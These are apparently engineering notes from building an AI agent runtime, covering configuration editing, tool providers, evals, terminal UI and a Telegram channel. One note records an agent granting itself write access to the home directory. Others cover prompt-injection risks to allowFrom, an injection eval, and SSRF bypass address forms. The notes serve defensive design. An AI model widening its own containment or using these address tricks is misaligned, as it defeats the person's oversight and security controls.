- **A commented-out top-level block is uncommented in place, never appended.** `setInSource` appends to
  a parent and a top-level key has none, so it declines every block a generated manifest ships
  commented and the round-trip runs: writing `channels` for the first time changed **98 lines**,
  indenting `# ── context ──` four spaces inside `model:`. With the fallback it is 11, all of them the
  block. And uncommenting beats appending anyway — the manifest documents each block where it belongs,
  and *that uncommenting works is the file's whole premise*.
- **The pane's manifest position comes from the command's own spec, and a typed slash command uses the
  palette's dispatch.** Two hand-kept lists, both wrong. `NO_MANIFEST` omitted `soul` (so `/soul
  distill` ran as `soul <manifestPath> distill` and the action became a path — broken for as long as it
  has been offered) and *included* `agents` (which takes a manifest first, so it ran with none); it also
  cannot express `config` and `memory`, where the manifest is positional **1**. And
  `resolveSessionCommand(text)` was called with no `offered` list, so no CLI command resolved when typed
  with arguments: the palette ran `/config` and typing `/config get model.main.id` spent a model turn
  instead. Both derived now. `dispatch`'s own comment already said it was "shared so the two cannot
  diverge" — only one of the two reached it.
- **`ambientEnv` is not "the agent's environment", and using it as one makes a surface lie.** It layers
  the *cwd*'s `.env` against an agent's — demoting a colliding variable so a project checkout cannot
  silently change which model a sandbox agent runs on — and returns `process.env` unchanged when nothing
  is in tension. It never *adds* the file beside the manifest; `loadManifest` does that through
  `layeredEnv`. Asked "is this set", it reported a token missing that plainly was not, and put `(not
  set)` on an editor row immediately after somebody set it. `lib/config-env.ts` is the honest version.
  The comment claiming the layered behaviour was written *before* the code that would have provided it,
  which is the transferable half.
- **`LineCursor` without `columns` truncates, and its own docstring says so — `TextField` never passed
  it.** So in the settings editor a value longer than the terminal was clipped at the right edge with
  the caret *past* the clip: you could not see what you were typing, and `tools.pinned` is 92 characters
  in a generated manifest, which makes it the first long value anybody opens. The wizard escaped it
  because a **bordered box bounds its text whatever the field passes** — and that distinction is the
  transferable part: `Prompt` passed `columns`, `TextField` did not, and only the caller drawing into an
  unbordered column was broken.
- **A test that passes with the fix reverted is not a guard, and the reflex is to assume symmetry.** On
  finding the truncation I wrote a wizard test to match, and it passed with the width removed — the
  bordered frame was already doing the work. Second time in two phases: `palette.test.ts` counted 11
  entries against a 16-row list and had never been able to fail. **Revert the fix and watch the new test
  go red** before believing it, and before claiming a second caller has the same bug.
- **A field that owns the screen should use it.** `FIELD_ROWS` is sized for a field sharing a box with
  other content; the settings editor's editing view draws a description, the field and a hint and nothing
  else, so bounding it at three rows made a 140-character value scroll while two-thirds of the terminal
  sat empty — a self-inflicted version of the bug being fixed. And naming the old value in the hint
  (`esc keeps …`) is useful for a scalar and becomes a truncated second copy of the line above it for a
  list, in the one row that should say which keys do what.
- **A prop that bounds a list is a ceiling; the terminal wins.** Handing the editor `MAX_SCREEN_ROWS` as
  its window put the whole list on a 30-row terminal — one row too many, so Ink's own output scrolled
  the buffer and the first block, the cursor and the footer went off the top with nothing saying so. An
  overflowing frame is corruption, not a scrollbar; clamp against the measured rows, which is the line
  `SkillBrowser` already had. And the slack goes **below** a long list: bottom-anchoring reads as a menu
  for a dozen short rows and starts twenty-plus settings mid-screen under eight blank ones.
- **A field consumed by one of two renderers looks consumed from the type and is silent in the other.**
  `Screen` puts `ScreenHeader.summary` on its own dim line; `titleLine`, the one-line variant every pane
  uses, dropped it — so the conversation switcher passed "pick a conversation" and the settings editor
  "settings", and neither had ever appeared. Not dead vocabulary, which is what makes it hard to see.
- **A surface that mounts Ink refuses a non-terminal.** `config edit` did not, and without a tty it wrote
  the alternate-screen escape **into a pipe** while Ink's own raw-mode error left the command exiting
  **0** — hard rule 8, from inside a command whose whole job is being careful. `resolveModeFromProcess`
  is the question `browse` and `init` already ask. Name the alternative in the refusal: "needs a
  terminal" on its own is a dead end for the scripted case.
- **`agent.yaml` is edited by `config_set`, never by `file_write`, and never by re-serialising it.**
  A whole-file overwrite cannot be validated; a targeted change is re-checked against the schema
  before anything is written. And `parseDocument` → `setIn` → `String(doc)` **reflows the file**: a
  comment between two top-level keys belongs to the end of the first, so re-emitting indents a section
  header into the section above — one change produced a thirty-line diff. `setInSource` edits the
  source text and falls back to the round-trip only when it cannot place a path.
- **`config_set` escalates on purpose, and two edits are floored.** Pinning tools and adding allow
  rules is the point. Replacing `tools.policy.deny` and setting `tools.untrusted.onMutate: allow` are
  refused whatever the policy says. `onMutate` has to *stay in the settable list* for that floor to be
  reachable — left out, the settable check ran first and refused `confirm` for the wrong reason.
- **A `trust: "trusted"` declaration on a provider tool needs a `trustReason`.** The warning fired at
  every boot of every system-provider agent, and a warning always present for a correct configuration
  is one nobody reads. With a reason it is silent and `tools` prints the reason; without one it still
  warns, which is the case worth catching.
- **`--system none` still names the provider and pins the config pair.** With nothing pinned there is
  no provider, so `available()` never runs and the agent cannot even tell you the file tools exist —
  it says "I don't have a tool that touches your file system" and, asked to enable one, that its
  tools are fixed at startup. Both true, both useless. `none` means no *file or shell* access, never
  "cannot read or change its own settings".
- **A tool observation has to fit `observationMaxTokens` or the model reads it again.** `config_read`
  returned the whole manifest — 2,766 tokens against a 2,000 budget — so it was middle-cut every
  time and a real model read it three times in one turn, 8,040 output tokens to change one line. The
  summary form is 549 tokens and the same task took one read. When a tool's output is *reference
  material*, size it against the budget rather than against what looks complete.
- **The agent must never widen its own containment.** `config_set` could write
  `tools.providerConfig.writeRoots`, and asked to create a file an agent granted itself the whole home
  directory and wrote there. Enabling a tool answers "what may I do"; a write root answers "where" —
  the second is the person's by definition. It is on the floor, and the floor is checked **before** the
  settable list or a floored path is refused as "not a setting" and the real reason never prints.
- **Confinement without instruction reads as a bug.** The tools were confined and nothing told the
  model where it worked, so it put things in `~`. Every path-taking argument now names the actual
  directory in its own description — next to the field being filled in, not in a preamble, because
  that is where a small model looks. And expand `~` *before* the root check: unexpanded it is not
  absolute, resolves against the workspace, and creates a directory literally named `~`.
- **`/restart` exists because an agent's settings are fixed for its lifetime.** The catalogue resolves
  once and slot 1 renders once, on purpose — so `config_set` cannot take effect in the session that
  called it, and `manifest_changed` says so. `runCommand` loops over `Runtime.create`; renderers return
  a `RESTART` symbol rather than a magic exit code.
- **A `ChatMessage` is no longer just `{role, content}`.** Under the `native` dialect it carries
  `toolCalls` or `toolCallId`, and every layer that copies a message must copy those too — the wire
  mapper in `chat-completions.ts`, the `message` field on `ContextBlock`, and the store's
  `tool_calls`/`tool_call_id` columns. Each of the three dropped them at some point during Phase 3,
  and none of the three failed loudly: the endpoint accepts the request and the model simply never
  sees the call it made.
- **A field threaded through a pipeline needs one test at the *end* of it, because a spread is not
  excess-property-checked.** `assembleContext` handled `skills` correctly and `previewContext` called
  it directly, so both were green — while `TurnInput` had no `skills` field at all and `Agent.send`
  passed one through `...(x ? {} : { skills })`, which TypeScript accepts silently. The block was
  dropped on the only path that matters, with the preview still reporting it perfectly. Same shape as
  `ChatMessage.toolCalls` above: every layer individually right and one of them not connected. The
  cheap guard is a test that reads the *request body* — `skills-turn.test.ts` records `fetch` and
  greps the prompt. A related way to be green for the wrong reason: a default parameter fires on an
  explicitly passed `undefined`, so `load(dir, undefined)` used the runner it was meant to omit, and
  the no-runner test passed while testing nothing.
- **`uv run` materialises `.venv/` and `uv.lock` inside the skill directory.** Verified live: a
  `page-count` skill with a `pyproject.toml` gained both on its first call, and the first run's
  observation carries uv's own `Creating virtual environment` chatter. Neither is a bug — it is what
  declaring a Python environment means — but a skill shipping Python needs those two paths in a
  `.gitignore`, and an author reading a first observation should know the noise is one-time.
- **Both dialects must put the same guidance in front of the model.** `native`'s
  `function.description` carries `whenToUse` and `whenNotToUse`, not just the summary. Trimming it to
  the summary makes `evals/tools` measure the guidance and report it as a property of the dialect.
- **Sandbox paths come from `cli/src/lib/sandbox.ts` and nowhere else.** `~/<BRAND.stateDir>` with
  a `<ENVPREFIX>HOME` override — tests point that at a tmpdir and never touch real HOME. Discovery
  uses `readManifestHeader`, never `loadManifest`: loading checks that key env vars are set, so a
  picker built on it fails exactly when it is needed most. Ref resolution is filesystem-first
  (git's pathspec rule); a bare name shadowed by a cwd entry prints a note instead of silently
  running the wrong agent — which happened in the first live test.
- **The chat banner lives INSIDE `<Static>` as a `banner` role item.** A sibling rendered above
  the transcript sits in Ink's dynamic region, which draws *below* Static output and redraws
  every frame. The plain path writes banner lines directly and never calls `seed`, which is what
  keeps plain output byte-identical.
- **`ink-testing-library` is a declared devDependency and every component has a frame test.** It sat
  unused from the commit that introduced Ink, which is why the paint was reported as unverifiable for
  three phases — wrong on both halves. A reducer test and a frame test are different claims: `rows.ts`
  was asserted as strings and correct while the rendered list wrapped at 40 columns, because nothing
  read a finished line. Use `test/helpers/frame.tsx`, not the library's `render` — its fake stdout
  hardcodes `columns` to 100, has no `rows` and emits no `resize`. Measure width in **code points**;
  `awk` counts bytes and reported 69 overlong lines where there were none. A boundaries test fails when
  a component arrives with no test, and it caught a real cursor bug within the hour.
- **Mount before you wait.** `browse.ts` fetched the catalogue at line 197 and mounted Ink at 249, so
  the twenty-second clone, its progress and the install report were all `process.stdout.write` — four
  of five phases of the command in plain text, which is what "why do you keep dropping out of the TUI"
  was about. termheat's `App.tsx` is the shape: mount, then `useEffect` → load, spinner inside the
  frame. And progress reaches the screen through a **callback**, never stdout, because writing to
  stdout while Ink owns the frame paints over it.
- **A key chord is verified against a real terminal, never against the parser.** Ink reporting *a* key
  says nothing about the bytes a terminal sent, and most chords have two spellings — ⌥← is `input "b" +
  meta` in Apple Terminal and `leftArrow + meta` in iTerm2; honour both. Two measured facts that cost a
  debugging round each: Ink holds a **lone ESC for 20 ms** before committing it
  (`ink/build/components/App.js:45`), so a test reading the frame immediately sees escape silently
  dropped and it looks like a component ignoring the key; and Ink already parses kitty's `CSI 13;2u`
  into `return + shift`, which is the whole reason shift+⏎ works after `terminal-setup` with no runtime
  change.
- **A cursor that runs out of list stays put; it never lands on an unselectable row.** `skipUnselectable`
  fell through to returning its own already-moved parameter, so ↑ on the first skill parked the cursor on
  the source heading where space and enter did nothing — and a heading draws no cursor, so the pointer
  disappeared from the list entirely. Walk in the direction of travel, then reverse, then stay; and read
  the direction off the **indices**, not the kind of move, because `first` travels backwards to row 0 and
  must then search forwards.
- **A `<Box>` inside a `<Text>` renders nothing at all — no error, an empty frame.** `LineCursor` became
  multi-line and therefore returns a `Box`; `TextField` still wrapped it in a `Text`, and the whole
  wizard field went blank. Only a frame test sees this. The related rule: a prompt glyph belongs in
  `LineCursor`'s `gutter`, not beside it, or the second line of a message starts one column left of the
  first and reads as a separate message.
- **The paste handler composes; it does not send.** Submitting every line in the chunk was right while
  the buffer was single-line, and became the bug multi-line exists to remove: a twelve-line block
  arrived as twelve messages, each conditioned on the last and none editable. When a data structure
  gains a capability, re-read the handlers that existed to work around its absence.
- **A module imported both statically and dynamically produces a bundle that will not parse.** `bun build
  --splitting` emits its exports twice — `SyntaxError: Duplicate export of 'browseCommand'`, and again for
  `SkillBrowser` twenty minutes later — and **`bun test` passes straight through it, because tests import
  source and the failure is in the bundle.** Splitting is not droppable: it is what keeps `import("ink")`
  off the startup path. So `boundaries.test.ts` bans the mixing from the source text (`import type` is
  exempt — erased, no edge), and `bundle.test.ts` starts the binary. Both are needed: the binary test
  cannot reach the rich-path chunks, which is the whole point of the lazy boundary. **Run the built
  binary after any change to how a module is imported.**
- **A view never mounts itself and never calls `useApp().exit()`.** It reports through `onDone`; the host
  unmounts (a command) or closes the pane (the chat). And `focused` gates its `useInput`, because Ink
  fires **every** active hook — a pane over a live prompt otherwise has two surfaces reading one
  keystroke, which is not a rendering bug but a wrong action.
- **A pane runs a command as a child process; it never borrows stdout.** Ink owns stdout while a session
  is mounted and writes a frame on every render, so swapping `process.stdout.write` for a collector means
  a frame lands in the collector instead of on screen — silently, intermittently, depending on timing.
  Pass the manifest path explicitly: a child resolves whichever agent the *cwd* suggests otherwise, which
  is a different agent and does not look wrong in the output.
- **`inSession` is required on every `CommandSpec`, and that is the point.** The palette is generated from
  `COMMANDS`, so a flag added to the CLI reaches the TUI with nothing to remember. A command that must not
  run in a session — `stop` would stop the session it was typed into — declares `hidden`. Keeping it out
  by omission from a second hand-written list is the drift `session-commands.ts` exists to end.
- **A slash command takes arguments only after a token that is *exactly* a known command.** The narrow
  lone-word rule still decides everything it can, because `/etc/passwd is world-readable` and `and/or` are
  things people say to an agent. The cost is that `/skils validate` is prose rather than a refusal — the
  cheaper of the two errors, and a mistyped *lone* command is still refused with a suggestion.
- **New CLI surfaces use the TUI kit and the pure-reducer grain.** Tokens/glyphs in
  `lib/theme.ts` (a literal colour name in a component is a review failure), components in
  `components/` are controlled and never call `useInput` — one `useInput` per screen root over a
  pure keymap (`keymap.ts`) and reducer (`lib/wizard.ts`, `lib/select.ts`). Screen roots mount
  via literal `import("ink")` only; boundaries tests enforce all of it.
- **The workspace templates exist twice, and the examples directory is the source.** `init`
  scaffolds from constants embedded in `cli/src/lib/templates.ts` because an installed binary has
  no `examples/` to read; `examples/workspace-template/` is the human-edited original, and
  `cli/test/templates.test.ts` fails on any byte difference. Editing either copy alone is a red
  CI run, not a silent divergence — update both, examples first.
- **A temperature-0 local endpoint can be fully deterministic, and then `--repeats` measures
  nothing.** Both 2026-08-14 qwen runs returned byte-identical replies on every pass — 37 fixtures
  × 3 passes with zero variation in `eval-tools`, the same in `eval-prompt-style` — so repeats
  cannot grow a sample there; only more *tasks* can, which is why `RULE_TASKS` went from ten to
  twenty. The flip side: fixture outcomes still differ *across* sessions and configurations, so a
  margin is only comparable at the same reasoning setting and server state. Never average passes
  from a deterministic endpoint and call the result more confident.
- **A saturated A/B probe still licenses one conclusion — "no difference at this difficulty" — and
  nothing more.** `eval prompt-style`'s examples question saturated at 100/100 in both arms; that
  rules out a placement *cost* on well-authored examples and does not confirm either vendor's
  claim. The escape is harder probes (`--rules 6` took intensity off the ceiling), not bigger
  samples of an easy one.
- **A placeholder in a prompt example is an instruction to a small model.** The NLT preamble said
  "exactly like this" and showed `field: value`; qwen3.5:9b wrote `field: title` / `value: <the value>`
  and NLT scored 27% against native's 92% — its reasoning about which tool and which arguments was
  correct every time. Examples in `PREAMBLE` are concrete, use a tool that exists in no catalogue, and
  are asserted by parsing the rendered catalogue with `parseNlt` itself. This cuts the other way too:
  because NLT's protocol is prose the model imitates and native's is a schema the API enforces, *any*
  defect in the preamble shows up as a dialect difference. Before believing an NLT-vs-native number,
  read what the model actually wrote — `results.json` keeps it on every non-`correct` attempt.
- **A field's floor has to move when the field moves.** `writeRoots` went from `tools.providerConfig`
  — a path `config_set` refused outright — to `tools.providers.system`, which sits *inside* a value the
  agent is allowed to write, because enabling the web provider is exactly what `config_set` is for. A
  floor pinned to the old path would have been a floor with a new way round it. It now refuses a
  `writeRoots` segment in any path **and** a `writeRoots` key nested anywhere inside a `tools.providers`
  value. When a settable field grows a nested shape, re-read the floor.
- **`tools.providers` is a map and the scalar is an alias, and the pair is refused rather than merged.**
  Merging would give the alias a position in the map that nobody wrote, and provider order decides which
  one is named first in a slug collision. Every reader goes through `resolveProviders` — the runtime,
  `Agent.create` (for the deprecation warning, so it lands on `agent.warnings` where a front end still
  finds it), `validate`, `tools --warm`, and `config_set`. `config_set` calls it *in addition to* the
  schema, because writing the map into a manifest that still has the scalar produces a document the
  schema accepts and the runtime refuses: an agent that boots today and not tomorrow, reported as success.
- **`tools --warm` asks the providers with no cache for their slugs too.** They have nothing to fetch,
  but they still answer for `exec` and `file_read` — and without asking, the missing-slug report blames
  every system tool in `pinned` for not being in Composio's catalogue. With several providers the
  question is whether *some* provider has the slug, never whether each one does.
- **A `setInSource` value can now be a map, and until it was it wrote `[object Object]`.** The renderer
  handled scalars and lists, which was exactly the settable set until `tools.providers` joined it. The
  symptom was a schema error reading "expected record, received array" — pointing nowhere near the cause.
  A map replacement also drops the line's trailing comment rather than carrying it, because the value
  has moved onto child lines and the comment would end up annotating a key.
- **`web_fetch` has no setting that permits a private address, and that absence is the design.** The
  reference manifest carried an `allowPrivateHosts: false` line before the code existed; writing the
  guard is what made the problem with it obvious. The single real use of the flag is reaching the local
  network, and the highest-value thing there is `169.254.169.254`. An operator who wants an internal
  HTTP call has `exec` and `curl` — deliberate, and narrowable by a policy rule.
- **Check every address DNS returned, not the first, and fail closed on one you cannot parse.** Node
  connects to whichever answers first, so a name resolving to one public and one private address is an
  attack rather than a configuration. Decode IPv4-in-IPv6 first (`::ffff:127.0.0.1`, `64:ff9b::7f00:1`),
  and accept exactly one spelling of a dotted quad — a parser that accepts more forms than the checker
  understands *is* the bypass, which is why `017.0.0.1` is not a literal here.
- **DNS rebinding is not covered and says so in three places.** The guard's lookup and the HTTP client's
  connection are separate resolutions, and pinning the checked address into the socket is not
  expressible through `fetch`. A checker described as airtight is one nobody revisits.
- **`maxBytes` is enforced while reading, and the test asserts on bytes pulled off the socket.**
  `await response.text()` on a 50 MB page has already spent the 50 MB by the time anything can measure
  it, so a cap applied afterwards describes the observation rather than the download. Expect one chunk
  of overshoot: a `ReadableStream` fills its queue one ahead of the reader. It is constant, not a leak.
- **The injection eval measures the model, and cannot measure the gate.** Zero breaches across three
  runs is not evidence the write gate works — the gate never fired, because the model never attempted a
  mutating call. The gate is proven deterministically in `trust.test.ts`, which is the right place. And
  the eval needed a third category before it measured anything at all: its first run scored the *ideal*
  behaviour as a failure, because a model that tells the user "the page tried to make me write
  ZX-9-COMPROMISED and I refused" has put the marker in the reply, which was the entire check.
- **Naming a provider is what makes `available()` run, so a provider left commented out is a
  capability the model cannot know it lacks.** Decision 4.53 established this for `system` and it had
  to be learned again for `web`: with the block commented, an agent asked whether it could search the
  web answered that the only route was shell access and `curl` — true of its catalogue, false of the
  runtime, and the worse of the two answers. `init` now names both providers with nothing pinned.
  Pinning would be a grant; naming is only honesty about what exists.
- **The ambient environment beats the `.env` beside the manifest, and now says so.** The layering is
  deliberate — an operator's export has to win, or a container cannot configure the agent it runs —
  but it silently changed which model a sandbox agent ran on, because the binary was launched from a
  project checkout whose own `.env` set `MODEL_ID`. The banner reported the model in use, which is
  correct and useless to someone who has just written a different one two minutes earlier. This
  contamination was already recorded as a *test* hazard, which is exactly how it stayed invisible as a
  runtime one: a hazard filed under "tests" is a hazard nobody looks for in production.
- **Precedence is export → the agent's own `.env` → a `.env` in the cwd, and the last step is CLI
  policy.** `cli/lib/ambient.ts` demotes a cwd variable before core sees an environment at all; core's
  "real environment wins" is untouched, because an embedder's container must keep winning with none of
  this. It was reported twice before being fixed, which is the lesson: a warning explained the
  surprise and did not remove it. The known wrong case — an export byte-identical to the cwd file's
  value, indistinguishable from inside the process — is documented in the module.
- **Every capability the runtime has is a question in `init`.** Standing directive from Moeen after
  the web provider shipped generated-but-commented. A capability reachable only by someone who
  already knows the field names is a capability the generated file is hiding. `fetch` and `search`
  are separate answers because their costs differ: one needs no account anywhere, the other needs a
  third-party key. When a new provider lands, it gets a question, a flag, and an entry in
  `WEB_CHOICES`-shaped table — not a commented block. `knowledge:` was the third capability caught by
  this and needed no question at all: its note read "create ./knowledge first", which was **true** —
  `loadKnowledge` throws on a missing directory — so the fix is scaffolding `knowledge/.keep` beside
  `skills/.keep` and writing the block live, exactly as skills and memory already do. Not every hidden
  capability wants a question; a switch that is off wants to *exist*. The trap that decides the shape:
  every `*.md` under `knowledge/` is an entry and must declare frontmatter `keywords`, so a `README.md`
  explaining how to author one **fails the load it was written to help with** — the guidance goes in the
  manifest comments, which nothing scans.
- **Only secrets go through `${VAR}`; a generated manifest writes the model id and base URL
  literally.** A model name is not a secret, and hard rule 10 governs secrets. Behind a variable the
  id cost three things: `readManifestHeader` does not expand — deliberately, so a listing never needs
  credentials — so every sandbox agent listed as `${MODEL_ID}` and the picker could not tell two
  apart; any `.env` on the machine changed the model *and* the resolved `contextWindow`, `thinking`
  and `promptStyle`, all derived from the id; and `validate` checked whichever agent the environment
  described. Expansion still works — it is just not what a generated file should reach for when the
  value is a fact about that agent. Corollary: **before putting a field behind a variable, check
  whether anything reads it unexpanded.**
  The exception is `examples/minimal`, which keeps `${MODEL_ID}` because demonstrating one manifest
  against four endpoints *is* its purpose — and it says so in the file. Read the cost from the other
  side too: with a literal, `MODEL_ID=x <binary> run` overrides nothing, which is exactly the
  no-silent-drift property and is why there is no ad-hoc override for a real agent.
- **`context.reserveOutput` budgets the prompt; `model.<role>.maxTokens` caps the endpoint. They are
  not the same number and must never be wired together again.** Reserve fed `max_tokens` for three
  phases, so a budgeting figure became a hard truncation — and on a reasoning model the truncation
  lands on the thinking, which is how qwen3.5:9b returned **empty content** against an 8,192 limit
  nobody chose. `max_tokens` is now absent from the wire unless configured. When a reply comes back
  empty at `finish_reason: length`, read the message: it names whether the limit was ours or the
  endpoint's, and says "no usage reported" rather than printing a contradictory "0 spent".
- **Reasoning streams to the screen by default when `capabilities.thinking !== "none"`.** Opt-in was
  wrong: it made a reasoning model look hung for thirty seconds while the only available signal was
  being generated and discarded. Resolved once in `run.ts` and narrowed to a required boolean on
  `Wired`, so no renderer decides it a second time.
- **Every context slot is framed except the one that was not, and that was the bug.** The static
  tier reads as a document, slot 1 opens with `# Tools`, untrusted output arrives fenced and
  labelled — and the volatile tier, whose whole job is *what you know about the person you work
  for*, arrived as a bare paragraph. A fresh agent with "Moeen is the person I work for" in its
  context answered "No, I can't read your name. Each session starts fresh." `VOLATILE_HEADER` fixes
  it, and the general rule is the useful part: **a fact with no frame is a fact a small model will
  not connect to a question.** Framing is structure and is allowed; rewriting an authored sentence
  is decision 4.19 and is not.
- **`bun run build` must build every package the binary imports, and for three phases it did not.**
  It built `core` and `cli`; the CLI imports `tools-system`, `tools-web` and `tools-composio` from
  their `dist`. So a provider change was invisible to the binary until someone rebuilt that package
  by hand, and the symptom is the worst kind — the new code is right, the test fails, and the stack
  trace points into a `dist` that still holds the old version. Recorded for `core` already; it was
  never a `core` property.
- **A provider reports an unresolved slug through `explainUnresolved()`, and never throws from
  `resolve()`.** The registry hands *every* provider the whole `pinned` list, so a cold Composio is
  asked about `config_read` and cannot know the system provider is about to answer for it. Throwing
  there refused a correct manifest with "2 pinned Composio tools are not in the resolution cache:
  config_read, config_set" — wrong in both halves. Both principles hold and neither is sufficient
  alone: omit what you do not know, *and* only the provider knows an empty cache is the reason
  rather than a typo. The provider supplies the sentence; the registry asks for it only once a slug
  is missing everywhere. Silent once the cache holds anything — past the first warm it really is a
  typo, and nearest-match is the better message.
- **Name a disabled provider when it can tell the model what it lacks; document it when it cannot.**
  `web: {}` is named while switched off because that is what makes `available()` run. Composio was
  the exception — a 25,000-tool catalogue has nothing useful to list — until the meta tools gave it
  two fixed entries, and it is now named like the others. The rule outlived the exception, which is
  the point: it is about what `available()` can *say*, not about the provider.
- **`tools --warm` refreshes the slugs already in `pinned`, so it can never discover one.** A slug
  had to be known before it could be warmed and warmed before it could be pinned, and the only way
  in was composio.dev in a browser. Nothing said so, and an agent asked to connect a Gmail account
  spent 4,417 output tokens finding out. `composio_search` is the way in now; `--warm` is still
  right for a slug someone typed in by hand.
- **Composio's router is for discovery; schemas come from `GET /tools/{slug}`.** Every router-side
  schema surface is thin — `tool_schemas` in a search result *and* `COMPOSIO_GET_TOOL_SCHEMAS* both
  return`tool_slug` for `slug`,`input_schema` for `input_parameters`, and **no`tags` at all**.
  Caching one fails three ways silently: a pinned tool reaches the model with **no arguments**;
  everything is assumed mutating for want of a `readOnlyHint`, so reading your own inbox serialises
  and holds a write slot; and the map does not reliably hold every slug the same response
  recommends. The first live search tagged all eight hits "(changes things)",`OUTLOOK_GET_MAIL_TIPS`
  included.
- **A discovered tool becomes a pinned tool, never an executed one.** `composio_search` finds a slug
  and caches its schema, `config_set` writes it into `tools.pinned`, and a restart makes it ordinary
  — one hop, phase-scopable. That is why there is no `composio_execute(slug, args)`: it would make
  every Composio task two-hop forever, which is what decision 4.7 refuses. Discovery is setup and
  setup happens once, at a moment the person is already pausing to click an OAuth link.
- **A meta tool that puts tool calls inside its own arguments is a hole, not a convenience.**
  `COMPOSIO_MULTI_EXECUTE_TOOL` is not shipped for the same reason `exec` has no `env` map and
  `memory_write` no file argument: the policy engine matches a tool plus a policy arg, and a batch
  is invisible to it. `composio_connect` carries `policyArg: "toolkit"` so `deny
  composio_connect(slack)` is expressible. The live session exposes six meta tools, not the four the
  docs list — the extra two are a remote bash and a schema fetcher.
- **A test that backgrounds a process must kill it, and `exec` must reap what it backgrounds.** One
  test left `while true; do :; done` running on every run; a day of runs put **33 orphaned shells**
  on the machine at ~23% CPU each, a load average of **351**, and a `runtime.ready` of **132
  seconds** — the boot budget, blown by the runtime's own litter, with nothing obviously wrong. The
  runtime leak was the same bug: `unref()` is not reaping. There is now a registry, a cap of 8, and
  `ToolProvider.stop()`, which `Runtime.stop` calls. Kill by process *group* — `sh -c "a | b | c"`
  killed by pid orphans two of three.
- **A slow boot is a symptom before it is a bug.** `ready in 132647 ms` and an earlier `ready in
  100339 ms` were both the machine being saturated, not the runtime being slow. `bench:boot` passes
  at 27 ms on an idle machine. Check `uptime` before profiling.
- **Slot 2 reports runtime state, not the manifest.** An agent told "channels: tg (telegram)" while
  running under `run` concluded the Telegram runtime had died and reported that nothing was
  listening on 7420 — from inside the running process. Every statement was true of the manifest and
  false of the moment. It is rendered lazily and frozen at first use, because channels start later
  inside `Runtime.create` and the port binds after it returns; `reportRuntimeState` throws if called
  after that, since slot 2 is in the cache-stable prefix.
- **An NLT field name has no spaces.** The class used to be `[\w .-]`, so any continuation line of a
  multi-line value containing a colon became a new field: `lsof -nP -iTCP:7420` parsed as the field
  `lsof -nP -iTCP`. A shell script is the normal value for `exec` and colons are everywhere in one.
- **The agent's own configuration is slot 2, injected — never left to `config_read`.** Knowing how
  you are set up was two-hop reasoning, which is what decision 4.7 refuses for tool discovery, and
  it fails harder here: a model that does not know a setting *exists* has no reason to look for it.
  Measured — an agent asked to put itself on Telegram, with `config_set` pinned, `config_set` in
  `policy.allow`, and a commented-out `channels` block in its own manifest, proposed Composio and
  then **started writing a Telegram bridge**. Every piece worked; none was reachable. The block
  names an absent capability as `none` rather than omitting it, because a missing row reads as "no
  such concept" and a `none` row reads as a switch that is off. Anything the runtime can be
  configured to do belongs in it — one row, not a new special case.
- **Enabling a capability is the agent's; who and where are the person's.** `config_set` may write
  `channels`, `delivery`, `server.enabled` and `server.port` — skipping a question in `init` must
  not be a dead end. It may never write `allowFrom`, `server.host`, `server.tokenEnv` or a
  `writeRoots` anywhere. `allowFrom` is the sharpest: it is the inbound gate, so an agent that could
  widen it could be talked into widening it by the message it is reading — and `config_set` is in
  `policy.allow` on a real manifest, so the write gate would not stop that. Floored by path *and* by
  the key hidden inside a value, both shapes.
- **A settable path with a new value *shape* silently writes `[object Object]`.** It happened for a
  map when `tools.providers` became settable, and again for a sequence of maps when `channels` did —
  and a third time in `config_read`'s summary, which stringifies list entries separately. The schema
  then rejects the result with a message pointing nowhere near the cause. Check the renderer whenever
  a new path's value is not a scalar.
- **`.env` is a protected path, so the agent cannot supply its own secrets — and must say so.** A
  `config_set` that names a new `tokenEnv` reports that the agent will not start until the variable
  is filled in. Without that the agent writes a channel, reports success, asks for a restart, and
  the restart fails to load.
- **A commented block's heading must not end in a colon.** `# Phase 4 — channels, delivery, and the
  HTTP server:` became a YAML key the moment someone uncommented the block, and the load failed
  complaining about a heading. The generated manifest's whole premise is that uncommenting works.
- **`serve` reads its token from `loaded.env`, never from `ambientEnv`.** `ambientEnv` returns the
  *process* environment; the agent's own `.env` is layered in by `loadManifest`. Reading the wrong
  one made a token sitting beside the manifest invisible, and the banner said "unauthenticated"
  while the file plainly had it. Every credential in this runtime comes from the manifest's live env.
- **Channels start inside `Runtime.create`, so `serve` passes its own bus in.** A listener attached
  to `runtime.bus` afterwards misses every status they emitted on the way up — the boot-warnings
  trap again. `RuntimeOptions.bus` exists for exactly this.
- **A long-poll holds for 30 seconds, so "connected" comes from `getMe`.** Reporting from the first
  `getUpdates` return left a working bot silent for half a minute, which is indistinguishable from
  a broken one. And do not key "announce once" on `offset === 0`: that stays true until the first
  message *ever* arrives, so an idle bot re-announced every 30 s forever.
- **A disabled channel is never constructed.** `enabled: false` is the one thing that has to work on
  a broken channel; a factory that ran anyway and refused for a missing token would make switching
  one off impossible. Its `type` is still checked.
- **`bun run build` before testing a workspace package from `src`.** Running `packages/cli/src/index.ts`
  still resolves `@dispach/channel-telegram` to its `dist`, so a transport change is invisible until
  that package is rebuilt. Recorded for `core` and the tool packages already; it is a property of
  every workspace dependency, and it cost a confused debugging round here.
- **`Bun.serve`'s `idleTimeout` defaults to 10 seconds and will kill your SSE streams.** The
  heartbeat is 15 s, so the server closed its own event streams before the first keep-alive frame —
  printing `[Bun.serve]: request timed out after 10 seconds` and closing *cleanly*, which a client
  reads as "the turn ended". No test saw it, because a test reads a stream to completion in
  milliseconds. `serve.ts` derives the timeout from `HEARTBEAT_MS` so the two cannot drift, and
  there is now a test that holds an idle stream past the old cutoff. **Run the binary.**
- **`serve` is the only command that starts channels, and `startChannels` decides *whether*, never
  *when*.** `run` builds the same runtime without them: a REPL that quietly began answering Telegram
  while you typed at it would be a surprise, and a one-shot `run --input` that opened a long-poll
  would hang on exit. Nothing connects before `runtime.ready` on either path.
- **A channel `start()` returns once *running*, not once connected.** Awaiting a first successful
  poll would make a Telegram outage an unbootable runtime, and an orchestrator watching `/v1/ready`
  would restart the process into the same outage. `/ready` deliberately flips before channels
  connect; channel state lives on the agent resource. Verified live with an invalid bot token.
- **The Telegram poll loop must never exit on its own.** A loop that throws and returns leaves a
  process that is running, reports nothing, and receives nothing forever. It catches everything,
  backs off, reports on the first failure and every eighth, and only `stop()` ends it. The offset
  advances *before* handling and unconditionally — durability is the outbox's job, not the cursor's.
- **Inbound turns are serialised per session key, and `ChannelHost.receive` never awaits one.** Two
  messages during a turn would otherwise race the same history and append over each other; and a
